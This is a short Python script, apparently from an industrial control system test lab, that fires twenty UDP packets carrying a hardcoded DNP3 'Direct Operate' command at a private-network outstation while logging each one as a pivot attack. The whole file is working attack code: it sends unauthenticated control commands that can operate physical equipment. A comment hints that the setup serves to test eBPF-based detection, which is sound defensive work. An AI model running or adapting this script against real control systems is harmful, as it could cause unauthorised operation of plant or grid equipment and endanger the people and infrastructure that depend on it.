#!/usr/bin/env python3
import json
import os
import time
import urllib.request
import urllib.parse
import socket
import time
import uuid
import urllib.request
import urllib.parse
import json
import random
import os

def run_port_sweep_attack():
    target_ip = "10.0.30.10"
    target_port = 20000
    pivot_ip = "10.0.10.99"
    attacker_ip = "172.16.0.99"
    attacker_ip = "172.16.0.99"
    
    # DNP3 FC 0x05 (Direct Operate) payload
    dnp3_fc5 = bytes.fromhex("0564074401000000010000008105000000")
    
    print("[+] Starting Pivot Port Sweep Attack (20 shots)...", flush=True)
    
    for i in range(20):
        src_port = random.randint(30000, 60000)
        trace_id = uuid.uuid4().hex
        parent_span_id = uuid.uuid4().hex[:16]
        
        # Webdis registration removed as per Phase 4-4-2 (delegated to eBPF)
        # 2. Fire the attack packet
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("", src_port))
        sock.sendto(dnp3_fc5, (target_ip, target_port))
        sock.close()
        
        print(f"[{i+1}/20] Fired Pivot Attack {pivot_ip} -> {target_ip} (src_port: {src_port})", flush=True)
        time.sleep(2.5)

    print("[+] Attack complete.")

if __name__ == "__main__":
    run_port_sweep_attack()
